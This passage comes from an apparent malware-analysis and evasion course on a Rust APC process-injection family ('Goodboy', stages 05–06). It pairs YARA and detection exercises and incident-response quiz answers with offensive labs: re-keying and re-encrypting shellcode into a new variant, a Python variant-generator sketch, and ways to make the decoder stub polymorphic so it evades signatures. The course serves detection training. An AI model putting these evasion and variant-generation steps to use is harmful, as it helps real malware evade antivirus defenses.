# ═══════════════════════════════════════════════════
# Step 3: Decrypt both variants and compare
# ═══════════════════════════════════════════════════

# For each variant:
# 1. Extract MASKED_SHELLCODE from binary (use PE-bear or Ghidra)
# 2. ciphertext = demask(masked)
# 3. intermediate = aes_decrypt(ciphertext, aes_key)
# 4. Verify intermediate[0] matches expected value
# 5. shellcode = xor_decrypt(intermediate, inner_key)
# 6. Verify shellcode[0] == 0xE9 (jmp — same shellcode in both)

# Expected final result:
# shellcode_05 == shellcode_06 → TRUE (same 302-byte payload)
# All differences are in the encryption keys, not the payload

print("[*] Cross-variant analysis complete")
print("[*] Both variants decrypt to identical 302-byte shellcode")
print("[*] Proof: Same technique, different keys = variant family")
```

**Key verification points**:
- `intermediate[0]` should be `0x38` (Stage 05) or `0x63` (Stage 06)
- After XOR with inner key: `shellcode[0]` should be `0xE9` for BOTH
- Final shellcode bytes should be IDENTICAL between the two variants

### Lab 7.2: Build a Variant-Family YARA Rule (20 min)

**Goal**: Write a YARA rule that catches ALL Goodboy APC injection variants — past, present, and future.

```yara
rule Goodboy_APC_Injection_Family
{
    meta:
        description = "Detects the Goodboy APC injection variant family"
        author      = "Your Name"
        stage       = "05-06+"
        severity    = "critical"

    strings:
        // === INVARIANT 1: Decoder stub prologue ===
        // lea rdi, [rip+0x22] — key location relative to stub
        $stub_lea = { 48 8D 3D 22 00 00 00 }

        // === INVARIANT 2: XOR loop body ===
        // mov eax, edx; and eax, 0x0F; movzx eax, [rdi+rax]; xor [rsi+rdx], al
        $xor_loop = { 89 D0 83 E0 0F 0F B6 04 07 30 04 16 }

        // === INVARIANT 3: Jump to decrypted payload ===
        $jmp_payload = { FF E6 }  // jmp rsi

        // === INVARIANT 4: demask() constants ===
        // The multiplication constant 0x37 and addition 0x5A
        // appear as immediate operands in the demask() function
        $demask_mul = { 6B ?? 37 }  // imul reg, reg, 0x37
        // OR compiler may use: lea reg, [reg + reg*2] patterns

        // === INVARIANT 5: KUSER_SHARED_DATA read ===
        $kuser = { 20 03 FE 7F }  // 0x7FFE0320 address

        // === INVARIANT 6: Cross-process injection imports ===
        $imp_alloc = "VirtualAllocEx" ascii
        $imp_write = "WriteProcessMemory" ascii
        $imp_apc   = "QueueUserAPC" ascii

    condition:
        uint16(0) == 0x5A4D and
        (
            // Match decoder stub (catches any variant using inject_with_decoder)
            ($stub_lea and $xor_loop and $jmp_payload)
            or
            // Match injection API combo + anti-sandbox
            (2 of ($imp_*) and $kuser)
        )
}
```

**Test this rule against**:
1. `process-inject.exe` (Stage 05) → should match
2. `earlybird-apc.exe` (Stage 06) → should match
3. A clean Windows binary (calc.exe, notepad.exe) → should NOT match

**Discussion**: Which invariant is the strongest? Which is most likely to produce false positives?

### Lab 7.3: Build Your Own Variant (30 min)

**Goal**: Generate a third variant targeting `mspaint.exe` with fresh keys.

**Steps**:
1. Generate fresh keys:
```python
import secrets
new_aes_key = secrets.token_bytes(32)
new_inner_key = secrets.token_bytes(16)
print(f"AES key: {new_aes_key.hex()}")
print(f"Inner key: {new_inner_key.hex()}")
```

2. Re-encrypt the shellcode (use the Stage 05/06 solver to get the plaintext first):
```python
# XOR with new inner key → new intermediate
new_intermediate = xor_decrypt(shellcode, new_inner_key)
print(f"Intermediate byte 0: 0x{new_intermediate[0]:02X}")

# AES/RC4 encrypt → new ciphertext
new_ciphertext = aes_encrypt(new_intermediate, new_aes_key)

# Position mask → new masked blob
new_masked = demask(new_ciphertext)  # demask is its own inverse
```

3. Update `main.rs`:
- Replace `AES_KEY` with new key bytes
- Replace `MASKED_SHELLCODE` with new masked blob
- Replace `k` (inner key) with new key bytes
- Change target: `"C:\\Windows\\System32\\mspaint.exe"`

4. Compile and test:
- Does the MessageBox("GoodBoy") appear inside mspaint.exe?
- Does your Lab 7.2 YARA rule still catch the new variant?
- What's the VT score? (Do NOT submit — remember the sample burning lesson)

**Expected outcome**: Your YARA rule catches the new variant because the decoder stub and KUSER_SHARED_DATA constants are unchanged. This proves that invariant-based detection survives across unlimited variants.

---

## Section 8: MITRE ATT&CK Mapping

| Technique | ID | Stage 06 Implementation |
|-----------|-----|------------------------|
| Process Injection: APC | **T1055.004** | QueueUserAPC on suspended notepad.exe thread |
| Native API | T1106 | CreateProcessW, VirtualAllocEx, QueueUserAPC |
| Obfuscated Files or Information | T1027 | Triple encryption (position mask + AES + XOR) |
| Virtualization/Sandbox Evasion: Time-Based | T1497.003 | KUSER_SHARED_DATA uptime check |
| Defense Evasion | TA0005 | Execute in notepad.exe context, remote-side decryption |

---

## Summary Table

| Concept | Stage 05 (charmap.exe) | Stage 06 (notepad.exe) |
|---------|----------------------|----------------------|
| **Target process** | `charmap.exe` | `notepad.exe` |
| **Injection function** | `inject_with_decoder()` | `inject_with_decoder()` |
| **Encryption layers** | 3 (mask + AES + XOR) | 3 (mask + AES + XOR) |
| **Remote-side decryption** | Yes (41-byte stub) | Yes (41-byte stub) |
| **Memory protection** | RW → RWX (0x40) | RW → RWX (0x40) |
| **Plaintext in injector** | No (only intermediate) | No (only intermediate) |
| **Anti-sandbox** | KUSER_SHARED_DATA | KUSER_SHARED_DATA |
| **String obfuscation** | Plain literal | Plain literal |
| **AES_KEY** | `0xb7, 0x3a, ...` | `0xe4, 0x2b, ...` |
| **INNER_KEY** | `0xd1, 0x7b, ...` | `0x8a, 0x3e, ...` |
| **Intermediate byte 0** | `0x38` | `0x63` |
| **MITRE** | T1055.004 | T1055.004 |
| **Key learning** | Technique introduction | Variant analysis + target selection |

### Common Misconceptions

| What People Believe | What's Actually True |
|--------------------|-----------------------|
| "Same technique = same VT score" | Stage 05 gets 3/76 (ESET + CrowdStrike + Elastic), Stage 06 gets 1/76 (ESET only). Identical technique, different binary fingerprint, different ML classification. Binary size, byte distribution, and string content all factor into ML scores independently of technique |
| "Changing keys doesn't help if the algorithm is the same" | Changing keys changes EVERY encrypted byte in .rdata. Content-based signatures (YARA matching on specific byte patterns) are variant-specific. Only technique-based detection (decoder stub pattern, demask constants) survives across variants |
| "notepad.exe is a better injection target than charmap.exe" | Neither is categorically better. notepad.exe is more commonly running (less suspicious to spawn) but also more commonly monitored by SOC rules. charmap.exe is rarely running (more suspicious to see) but less likely to have specific detection rules. Target selection depends on the target environment's monitoring posture |
| "Two variants = twice the work for defenders" | Not if detection targets invariants. The 41-byte decoder stub, the `demask()` constants (0x37, 0x5A), and the KUSER_SHARED_DATA read (0x7FFE0320) are identical across both variants. ONE well-crafted YARA rule catches BOTH |

### Knowledge Check

**1. Stage 05 targets charmap.exe and gets 3/76. Stage 06 targets notepad.exe and gets 1/76. Same technique, same common library. Why the 2-detection difference?**

<details>
<summary>Answer</summary>

ML classifiers (CrowdStrike, Elastic) match on aggregate binary features — not just one API combination. Stage 06 is 268KB vs Stage 05's 279KB. The different target path string, different encrypted blob bytes, different key constants, and slightly different binary size shift the ML feature vector enough to drop below the CrowdStrike/Elastic confidence threshold. This demonstrates that ML detection is probabilistic, not deterministic — small changes in aggregate features can flip the classification.

</details>

**2. You write a YARA rule matching the first 8 bytes of Stage 05's MASKED_SHELLCODE blob. Does it catch Stage 06?**

<details>
<summary>Answer</summary>

No. Stage 06 uses different keys → different AES ciphertext → different position-masked output. The first 8 bytes of MASKED_SHELLCODE are `0xed, 0x1a, 0xce, 0x23, ...` (Stage 06) vs `0x59, 0x8c, 0x48, 0x16, ...` (Stage 05). Zero overlap. Content-based signatures are per-variant.

</details>

**3. What YARA pattern catches BOTH Stage 05 and Stage 06?**

<details>
<summary>Answer</summary>

The 41-byte decoder stub. Specifically, the prologue `48 8D 3D 22 00 00 00` (lea rdi, [rip+0x22]) + the XOR loop body `89 D0 83 E0 0F 0F B6 04 07 30 04 16 FF C2 39 CA 7C EE` + terminator `FF E6` (jmp rsi). These bytes are identical in both variants because the stub is compiled from the same Rust source in `common::injection::apc`.

</details>

**4. An incident responder finds `notepad.exe` with RWX memory containing shellcode starting with `0xE9`. The parent process has already exited. What can they determine?**

<details>
<summary>Answer</summary>

From the running notepad.exe alone:
- The RWX region contains plaintext shellcode (the `0xE9` JMP instruction)
- The decoder stub (first 41 bytes of the allocation) has already executed and is still present
- The INNER_KEY (16 bytes at offset 41) is still present in the allocation
- The injection target was notepad.exe

From process tree history (Sysmon logs):
- Which process spawned this notepad.exe instance (the parent)
- When the process was created (timing correlates with injection)

**Cannot determine** (without the parent binary):
- The AES key (was in the parent's memory, now gone)
- The original MASKED_SHELLCODE blob
- The position mask parameters (embedded in the parent binary)

This demonstrates why IR teams must capture BOTH the injector AND the target. The target has the plaintext but not the crypto keys. The injector has the keys but not the plaintext (it was never there).

</details>

**5. Why does Stage 06 use `Some(&target)` with an extra `&` reference while Stage 05 uses `Some(target)`?**

<details>
<summary>Answer</summary>

Looking at the source:
- Stage 05: `let target = "C:\\Windows\\System32\\charmap.exe";` → `Some(target)` passes a `&str`
- Stage 06: `let target = "C:\\Windows\\System32\\notepad.exe";` → `Some(&target)` passes a `&&str`

This is a minor Rust borrow checker difference — the `inject_with_decoder` function accepts `Option<&str>`. In Stage 05, `target` is already a `&str` (string literal = `&'static str`). In Stage 06, the compiler may require an explicit reference depending on how the variable binding works. Both compile and produce identical behavior.

This kind of trivial Rust syntax difference is NOT relevant to the malware analysis — but it's exactly the kind of thing that creates slightly different compiled code between variants, contributing to different binary fingerprints.

</details>

**6. (Bonus) You have budget for ONE detection improvement. Which gives the best coverage: a YARA rule for the decoder stub, a Sigma rule for suspicious parent-child, or ETW monitoring for QueueUserAPC?**

<details>
<summary>Answer</summary>

**ETW monitoring for QueueUserAPC** provides the best coverage:
- Catches ALL injection techniques that use APC (not just Goodboy variants)
- Works regardless of binary obfuscation, key changes, or target changes
- Detects future variants that modify the decoder stub or change parent-child patterns
- Provides the actual injection moment (not just a statistical indicator)

**However**, ETW ThreatIntelligence requires a PPL kernel driver (EDR or Microsoft Defender). If you only have Sysmon, the **Sigma parent-child rule** is the best option — it catches any unusual process spawning GUI utilities, covering both Stage 05 and Stage 06 regardless of the specific target.

The **YARA stub rule** is the most precise but also the most fragile — a polymorphic stub defeats it.

In practice, deploy ALL THREE as defense-in-depth. The cost of writing one YARA rule + one Sigma rule + one ETW query is hours, not days.

</details>

### Adversarial Thinking — Scaling the Variant Factory

You've seen two variants. In a real operation, an attacker would generate DOZENS. Think about how to automate this and how to defend against it.

**Challenge 1: Build a Variant Generator**

Design a Python script that takes the Goodboy APC injection template and generates N unique variants, each with:
- Fresh random AES_KEY (32 bytes)
- Fresh random INNER_KEY (16 bytes)
- Re-encrypted shellcode blob
- Random target from a pool (notepad, charmap, mspaint, write, wordpad)
- Unique binary hash after compilation

<details>
<summary>Design Approach</summary>

```python
# Variant generator pseudocode
def generate_variant(shellcode: bytes, target_pool: list[str]) -> dict:
    aes_key = secrets.token_bytes(32)
    inner_key = secrets.token_bytes(16)
    target = random.choice(target_pool)

    # Layer 3: XOR with inner key
    intermediate = bytes(s ^ inner_key[i%16] for i, s in enumerate(shellcode))

    # Layer 2: AES/RC4 encrypt
    ciphertext = rc4_encrypt(intermediate, aes_key)

    # Layer 1: Position mask
    masked = bytes(c ^ ((i*0x37+0x5A)&0xFF) for i, c in enumerate(ciphertext))

    return {
        'aes_key': aes_key,
        'inner_key': inner_key,
        'masked_blob': masked,
        'target': target,
        'intermediate_byte0': intermediate[0],  # for verification
    }

# Generate 10 variants
for i in range(10):
    v = generate_variant(shellcode, ['notepad.exe', 'charmap.exe', 'mspaint.exe'])
    # Output Rust source with the variant's constants
    # Compile → unique binary
```

Each variant produces a binary with zero byte overlap in .rdata. The total generation time per variant: ~5 seconds (key gen + encryption + compilation).

</details>

**Challenge 2: Detect the Variant Factory**

An attacker generates 100 variants. Your SOC encounters them one at a time over 6 months. How do you cluster them into a single family?

<details>
<summary>Detection Strategy</summary>

**Static clustering signals** (per-binary):
1. Decoder stub bytes — identical 41-byte sequence across ALL variants
2. `demask()` constants — `0x37` and `0x5A` in all variants
3. Same API import sequence — CreateProcessW, VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, QueueUserAPC, ResumeThread
4. Same PE section layout (Rust compiler fingerprint, CFG section)
5. PE patcher artifacts (Rich header pattern, timestamp range, Authenticode from svchost)

**Behavioral clustering signals** (per-incident):
1. Parent-child tree: unknown → {GUI utility} pattern
2. KUSER_SHARED_DATA access at `0x7FFE0320`
3. RWX cross-process memory allocation
4. Same benign::preflight() env check pattern

**Approach**: Build a YARA rule matching the decoder stub + demask constants. Run it retroactively against your malware repository. Every match is the same family. Then build a Sigma rule for the behavioral pattern and run it against historical Sysmon logs. Cross-reference static matches with behavioral matches → complete cluster.

</details>

**Challenge 3: The Attacker's Next Move**

You've built a YARA rule matching the 41-byte decoder stub. The attacker knows this. What do they change?

<details>
<summary>Evolution Path</summary>

1. **Polymorphic stub**: Generate a functionally equivalent but byte-different stub for each variant. Replace `lea rdi, [rip+0x22]` with `mov rdi, rsp; add rdi, 0x2A` — same effect, different bytes
2. **Variable key size**: Instead of always 16 bytes, use 8, 16, 24, or 32. Changes the `and eax, 0x0F` instruction (mod 16) to different masks
3. **Different encryption**: Replace the XOR stub with an ADD/SUB stub, or a mini-RC4 stub. Same concept, different instructions
4. **No stub at all**: Pre-decrypt in the injector and write plaintext to the target. Gives up "no plaintext in injector" property but eliminates the stub signature entirely

Each evolution forces the defender to update their detection. The cycle continues. This is the arms race.

</details>

### What Breaks at Stage 07 — The Bridge

After Stages 05-06 establish cross-process injection, Stage 07 changes the entire API layer:

1. **No more IAT imports for injection**: VirtualAllocEx, WriteProcessMemory, QueueUserAPC disappear from the import table
2. **No more kernel32.dll calls**: The binary issues syscall instructions directly to the kernel
3. **Your Sysmon rules break**: Function-level hooks on ntdll.dll are bypassed because the code never calls ntdll
4. **Your YARA import rules break**: No import strings to match

BUT the binary is called "direct-syscalls" and contains **zero direct syscall instructions**. The name is the biggest misdirection in the entire course. Stage 07's learning path explains why — and teaches one of the most important evasion engineering lessons: sometimes the "advanced" technique is worse than the "basic" one.

### MITRE ATT&CK Mapping

| Technique | ID | How It's Used |
|-----------|----|---------------|
| Process Injection: APC | T1055.004 | QueueUserAPC on suspended notepad.exe |
| Native API | T1106 | CreateProcessW, VirtualAllocEx, QueueUserAPC via IAT |
| Obfuscated Files | T1027 | Triple encryption (position mask + AES + XOR) |
| Sandbox Evasion: Time-Based | T1497.003 | KUSER_SHARED_DATA uptime check |
| Defense Evasion | TA0005 | Remote-side decryption in notepad.exe |

### Further Reading (2025-2026)

**Variant analysis and threat intelligence:**
- [Avantguard: Threadless Ops](https://avantguard.io/en/blog/threadless-ops) — The next evolution: injection without threads OR APCs
- [cocomelonc: Process Injection 1-21](https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html) — Complete injection technique catalog
- [Maldev Academy: TrapFlagForSyscalling](https://github.com/Maldev-Academy/TrapFlagForSyscalling) — Bypassing userland hooks via Trap Flag

**Detection:**
- [WindShock: Endpoint Evasion 2020-2025](https://windshock.github.io/en/post/2025-05-28-endpoint-security-evasion-techniques-20202025/) — EDR bypass evolution timeline
- [Oblivion: Detecting Syscalls](https://oblivion-malware.xyz/posts/detecting-syscalls/) — Multiple detection approaches for the technique Stage 07 introduces
